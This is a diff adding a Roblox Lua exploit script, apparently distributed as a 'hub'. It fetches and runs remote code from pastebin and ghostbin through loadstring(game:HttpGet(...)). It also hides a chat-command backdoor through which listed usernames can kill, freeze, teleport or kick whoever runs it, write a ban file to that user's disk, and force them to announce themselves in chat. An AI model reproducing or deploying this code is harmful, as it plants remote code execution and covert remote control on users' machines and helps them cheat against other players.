@@ -1,0 +1,719 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/Crd0z6UZ"))()
+
+
+
+local Players = game:GetService("Players")
+
+local TextChatService = game:GetService("TextChatService")
+
+local TeleportService = game:GetService("TeleportService")
+
+local TweenService = game:GetService("TweenService")
+
+local RunService = game:GetService("RunService")
+
+local Lighting = game:GetService("Lighting")
+
+local Workspace = game:GetService("Workspace")
+
+
+
+local player = Players.LocalPlayer
+
+local PlaceId = game.PlaceId
+
+
+
+local IS_ADMIN = {
+
+    ["Roun95"] = true, ["Deluxe_Studios"] = true, ["ANT_MANDRKAES"] = true,
+
+    ["davicap2014"] = true, ["joaozinho_ofc2014"] = true,
+
+    ["Hayatogames2000"] = true, ["SUPER_RODRIGO90"] = true, ["Lolyta6663"] = true,
+
+    ["Laelmano24"] = true
+
+}
+
+
+
+local IS_DEV = {
+
+    ["MATHIOSS12345"] = true, ["Usuario_X1x1x1"] = true, ["Mrbrookhaven_RBX1"] = true
+
+}
+
+
+
+local frozenPlayers = {}
+
+local kamuiRunning = false
+
+local iphoneTeleport = CFrame.new(100022.922, 100024.219, 10.8043213)
+
+local ipadTeleport = CFrame.new(50957, 100173, 10)
+
+
+
+local function normalize(str) return string.lower((str or ""):gsub("%s+", "")) end
+
+local function matchesPlayer(input, target)
+
+    input = normalize(input)
+
+    return normalize(target.Name):sub(1, #input) == input
+
+       or normalize(target.DisplayName):sub(1, #input) == input
+
+end
+
+
+
+local function freezePlayer(hum, freeze)
+
+    if hum then
+
+        hum.PlatformStand = freeze
+
+        frozenPlayers[hum.Parent] = freeze and true or nil
+
+    end
+
+end
+
+
+
+local function canAffect(executor, target)
+
+    if executor == target then return false end
+
+    if not target or not target.Character then return false end
+
+    if IS_DEV[executor.Name] then return not IS_DEV[target.Name]
+
+    elseif IS_ADMIN[executor.Name] then return not IS_ADMIN[target.Name] and not IS_DEV[target.Name]
+
+    end
+
+    return false
+
+end
+
+
+
+local function kamuiEffect(teleportTo, dealDamage, itemName, targetPlayer)
+
+    if kamuiRunning then return end
+
+    kamuiRunning = true
+
+
+
+    local cam = Workspace.CurrentCamera
+
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    local gui = Instance.new("ScreenGui", playerGui)
+
+    gui.Name = "KamuiGui"
+
+    gui.ResetOnSpawn = false
+
+
+
+    local black = Instance.new("Frame", gui)
+
+    black.Size = UDim2.new(10,0,10,0)
+
+    black.Position = UDim2.new(-5,0,-5,0)
+
+    black.BackgroundColor3 = Color3.new(0,0,0)
+
+    black.BackgroundTransparency = 1
+
+    TweenService:Create(black, TweenInfo.new(0.8), {BackgroundTransparency = 0}):Play()
+
+
+
+    local img = Instance.new("ImageLabel", gui)
+
+    img.AnchorPoint = Vector2.new(0.5,0.5)
+
+    img.Position = UDim2.new(0.5,0,0.5,0)
+
+    img.Size = UDim2.new(0,0,0,0)
+
+    img.BackgroundTransparency = 1
+
+    img.ImageTransparency = 1
+
+    img.Image = (itemName == "Ipad") and "rbxassetid://76627917637500" or "rbxassetid://138478410605527"
+
+
+
+    local blur = Instance.new("BlurEffect", Lighting)
+
+    local cc = Instance.new("ColorCorrectionEffect", Lighting)
+
+    TweenService:Create(blur, TweenInfo.new(0.5), {Size = 15}):Play()
+
+    TweenService:Create(cc, TweenInfo.new(0.5), {Contrast = 0.4, Brightness = -0.2, Saturation = -0.3}):Play()
+
+
+
+    local soundEnter = Instance.new("Sound", cam)
+
+    local soundExit = Instance.new("Sound", cam)
+
+    soundExit.SoundId = "rbxassetid://108116949942607"
+
+    soundExit.Volume = 0.8
+
+
+
+    if itemName == "Iphone" then
+
+        soundEnter.SoundId = "rbxassetid://997057912"
+
+        soundEnter.Volume = 0.8
+
+        local soundExtra = Instance.new("Sound", cam)
+
+        soundExtra.SoundId = "rbxassetid://7288361610"
+
+        soundExtra.Volume = 0.8
+
+        soundEnter:Play()
+
+        soundExtra:Play()
+
+    end
+
+
+
+    task.delay(0.8, function()
+
+        local spin = RunService.RenderStepped:Connect(function()
+
+            img.Rotation = (img.Rotation + 6) % 360
+
+        end)
+
+
+
+        TweenService:Create(img, TweenInfo.new(0.5), {Size = UDim2.new(0,500,0,500), ImageTransparency = 0.2}):Play()
+
+
+
+        if itemName == "Ipad" then
+
+            soundEnter.SoundId = "rbxassetid://94417536898415"
+
+            soundEnter.Volume = 0.8
+
+            soundEnter:Play()
+
+        end
+
+
+
+        task.delay(1.6, function()
+
+            local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+            if root then root.CFrame = teleportTo end
+
+
+
+            if dealDamage and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+
+                if not (IS_ADMIN[targetPlayer.Name] or IS_DEV[targetPlayer.Name]) then
+
+                    targetPlayer.Character.Humanoid.Health = 0
+
+                end
+
+            end
+
+
+
+            soundExit:Play()
+
+            TweenService:Create(img, TweenInfo.new(0.8), {Size=UDim2.new(0,0,0,0), ImageTransparency=1, Rotation=img.Rotation+180}):Play()
+
+            TweenService:Create(black, TweenInfo.new(1), {BackgroundTransparency=1}):Play()
+
+            TweenService:Create(blur, TweenInfo.new(1), {Size=0}):Play()
+
+            TweenService:Create(cc, TweenInfo.new(1), {Contrast=0,Brightness=0,Saturation=0}):Play()
+
+
+
+            spin:Disconnect()
+
+            task.delay(1,function() gui:Destroy() blur:Destroy() cc:Destroy() kamuiRunning=false end)
+
+        end)
+
+    end)
+
+end
+
+
+
+local function applyCommand(cmd, target, executor, extra)
+
+    local char = target.Character
+
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+    cmd = normalize(cmd)
+
+
+
+    pcall(function()
+
+        if cmd == "kill" and hum then
+
+            if canAffect(executor,target) then hum.Health=0 end
+
+        elseif cmd == "bring" then
+
+            if canAffect(executor,target) and executor.Character and target.Character then
+
+                local exRoot = executor.Character:FindFirstChild("HumanoidRootPart")
+
+                local tgRoot = target.Character:FindFirstChild("HumanoidRootPart")
+
+                if exRoot and tgRoot then tgRoot.CFrame = exRoot.CFrame end
+
+            end
+
+        elseif cmd == "freeze" then if canAffect(executor,target) then freezePlayer(hum,true) end
+
+        elseif cmd == "unfreeze" then if canAffect(executor,target) then freezePlayer(hum,false) end
+
+        elseif cmd == "kick" then if canAffect(executor,target) then target:Kick("Você foi expulso pelo administrador.") end
+
+        elseif cmd == "ban" then
+
+            if canAffect(executor,target) then
+
+                local nomeArquivo="SpywareDetect.txt"
+
+                if writefile and not isfile(nomeArquivo) then
+
+                    writefile(nomeArquivo,"Você foi banido permanentemente por: "..executor.Name)
+
+                end
+
+                if isfile and isfile(nomeArquivo) then
+
+                    target:Kick("You Have Been Permanently Banned By Admin: "..executor.Name)
+
+                end
+
+            end
+
+        elseif cmd == "verify" then
+
+            if not (IS_DEV[player.Name] or IS_ADMIN[player.Name]) then
+
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+
+                    TextChatService.TextChannels.RBXGeneral:SendAsync("Shnmax_Hub")
+
+                end
+
+            end
+
+        elseif cmd == "tp" and extra then
+
+            if executor ~= player then return end
+
+            for _, plr in pairs(Players:GetPlayers()) do
+
+                if matchesPlayer(extra,plr) then
+
+                    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
+
+                        char.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame
+
+                    end
+
+                    break
+
+                end
+
+            end
+
+        elseif cmd == "rejoin" then
+
+            if executor ~= player then return end
+
+            local JobId=game.JobId
+
+            if #Players:GetPlayers()<=1 then
+
+                executor:Kick("\nRejoining...")
+
+                task.wait()
+
+                TeleportService:Teleport(PlaceId,executor)
+
+            else
+
+                TeleportService:TeleportToPlaceInstance(PlaceId,JobId,executor)
+
+            end
+
+        elseif cmd == "sharingan" then
+
+            kamuiEffect(iphoneTeleport,true,"Iphone",target)
+
+        elseif cmd == "kamui" then
+
+            kamuiEffect(ipadTeleport,false,"Ipad",target)
+
+        elseif cmd == "sharinganall" then
+
+            for _, plr in pairs(Players:GetPlayers()) do
+
+                kamuiEffect(iphoneTeleport,true,"Iphone",plr)
+
+            end
+
+        elseif cmd == "kamuiall" then
+
+            for _, plr in pairs(Players:GetPlayers()) do
+
+                kamuiEffect(ipadTeleport,false,"Ipad",plr)
+
+            end
+
+        end
+
+    end)
+
+end
+
+
+
+local function setupChatListener()
+
+    pcall(function()
+
+        local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+
+        channel.MessageReceived:Connect(function(message)
+
+            local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+
+            if not sender then return end
+
+            local rawText = message.Text
+
+            local text = normalize(rawText)
+
+
+
+            local globalCmds={
+
+                [";killall"]="kill", [";bringall"]="bring", [";freezeall"]="freeze", [";unfreezeall"]="unfreeze",
+
+                [";kickall"]="kick", [";banall"]="ban", [";verify"]="verify", [";rejoin"]="rejoin", [";tp"]="tp",
+
+                [";sharinganall"]="sharinganall", [";kamuiall"]="kamuiall"
+
+            }
+
+
+
+            for cmdPrefix, cmdName in pairs(globalCmds) do
+
+                if text:sub(1,#cmdPrefix)==cmdPrefix then
+
+                    local extraArg = rawText:match("^"..cmdPrefix.."%s+(.+)$")
+
+                    if cmdName=="tp" or cmdName=="rejoin" then
+
+                        applyCommand(cmdName,player,player,extraArg)
+
+                    else
+
+                        applyCommand(cmdName,player,sender,extraArg)
+
+                    end
+
+                    return
+
+                end
+
+            end
+
+
+
+            local cmd,targetName = rawText:match("^;(%w+)%s+(.+)$")
+
+            if cmd and targetName then
+
+                for _,plr in pairs(Players:GetPlayers()) do
+
+                    if matchesPlayer(targetName,plr) then
+
+                        applyCommand(cmd,plr,sender)
+
+                        break
+
+                    end
+
+                end
+
+            end
+
+        end)
+
+    end)
+
+end
+
+
+
+setupChatListener()
+
+
+
+if IS_DEV[player.Name] or IS_ADMIN[player.Name] then
+
+    loadstring(game:HttpGet("https://ghostbin.axel.org/paste/xs2tr/raw"))()
+
+end
+
+
+
+if IS_DEV[player.Name] or IS_ADMIN[player.Name] then
+
+    loadstring(game:HttpGet("https://pastebin.com/raw/7Yjw37wF"))()
+
+end
+
+
+
+local Players = game:GetService("Players")
+
+local RunService = game:GetService("RunService")
+
+
+
+local targetPlayers = {
+
+    "Usuario_X1x1x1",
+
+    "NOEL_A21S",
+
+    "MAC10_SCRIPTS",
+
+    "ANT_MANDRAKES",
+
+}
+
+
+
+local itemName = "Cuffs"
+
+local modelId = "rbxassetid://139095994241374"
+
+local playerData = {}
+
+
+
+local function isTargetPlayer(name)
+
+    for _, targetName in ipairs(targetPlayers) do
+
+        if name == targetName then return true end
+
+    end
+
+    return false
+
+end
+
+
+
+local function removeMeshFromTool(tool)
+
+    for _, obj in ipairs(tool:GetDescendants()) do
+
+        if obj.Name == "Mesh" then obj:Destroy() end
+
+    end
+
+end
+
+
+
+local function cleanupModels(data)
+
+    if not data then return end
+
+    if data.conn then data.conn:Disconnect() end
+
+    for _, obj in pairs({"rightModel","leftModel","headModel"}) do
+
+        if data[obj] and data[obj].Parent then
+
+            data[obj]:Destroy()
+
+        end
+
+    end
+
+end
+
+
+
+local function attachModels(character)
+
+    local rightHand = character:FindFirstChild("RightHand") or character:FindFirstChild("Right Arm")
+
+    local leftHand = character:FindFirstChild("LeftHand") or character:FindFirstChild("Left Arm")
+
+    local head = character:FindFirstChild("Head")
+
+    if not (rightHand and leftHand and head) then return nil end
+
+
+
+    local rightModel = game:GetObjects(modelId)[1]
+
+    local leftModel = game:GetObjects(modelId)[1]
+
+    local headModel = game:GetObjects(modelId)[1]
+
+
+
+    rightModel.Parent = workspace
+
+    leftModel.Parent = workspace
+
+    headModel.Parent = workspace
+
+
+
+    local rightOffset = CFrame.new(0, -0.2, 0) * CFrame.Angles(math.rad(180), math.rad(100), 0)
+
+    local leftOffset = CFrame.new(0, -0.2, 0) * CFrame.Angles(math.rad(180), math.rad(-270), 0)
+
+    local headOffset = CFrame.new(0, -0.1, -0.5)
+
+
+
+    local conn
+
+    conn = RunService.RenderStepped:Connect(function()
+
+        if not character.Parent then conn:Disconnect() return end
+
+        rightModel:PivotTo(rightHand.CFrame * rightOffset)
+
+        leftModel:PivotTo(leftHand.CFrame * leftOffset)
+
+        headModel:PivotTo(head.CFrame * headOffset)
+
+    end)
+
+
+
+    return {rightModel=rightModel, leftModel=leftModel, headModel=headModel, conn=conn}
+
+end
+
+
+
+local function monitorTarget(player)
+
+    local function resetModels(character)
+
+        if playerData[player] then
+
+            cleanupModels(playerData[player])
+
+            playerData[player] = nil
+
+        end
+
+    end
+
+
+
+    local function checkToolEquipped(character)
+
+        local tool = character:FindFirstChildOfClass("Tool")
+
+        local hasItemEquipped = tool and tool.Name == itemName
+
+        resetModels(character)
+
+
+
+        if hasItemEquipped then
+
+            removeMeshFromTool(tool)
+
+            playerData[player] = attachModels(character)
+
+        else
+
+            playerData[player] = {} -- Sem modelo nas costas
+
+        end
+
+    end
+
+
+
+    local function onCharacterAdded(character)
+
+        character.ChildAdded:Connect(function(child)
+
+            if child:IsA("Tool") then checkToolEquipped(character) end
+
+        end)
+
+        character.ChildRemoved:Connect(function(child)
+
+            if child:IsA("Tool") then checkToolEquipped(character) end
+
+        end)
+
+        task.wait(1)
+
+        checkToolEquipped(character)
+
+    end
+
+
+
+    if player.Character then onCharacterAdded(player.Character) end
+
+    player.CharacterAdded:Connect(onCharacterAdded)
+
+end
+
+
+
+for _, p in ipairs(Players:GetPlayers()) do
+
+    if isTargetPlayer(p.Name) then monitorTarget(p) end
+
+end
+
+
+
+Players.PlayerAdded:Connect(function(p)
+
+    if isTargetPlayer(p.Name) then monitorTarget(p) end
+
+end)
